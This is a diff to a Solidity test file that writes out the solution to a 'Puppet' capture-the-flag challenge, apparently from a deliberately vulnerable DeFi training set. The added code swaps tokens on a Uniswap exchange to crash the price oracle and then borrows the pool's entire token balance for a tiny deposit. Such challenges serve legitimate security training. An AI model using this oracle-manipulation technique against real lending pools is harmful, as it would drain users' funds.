@@ -119,7 +119,18 @@ contract Puppet is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        uniswapExchange.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE - 1,
+            1,
+            1
+        );
+        uint256 amount = puppetPool.calculateDepositRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+        puppetPool.borrow{value: amount}(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
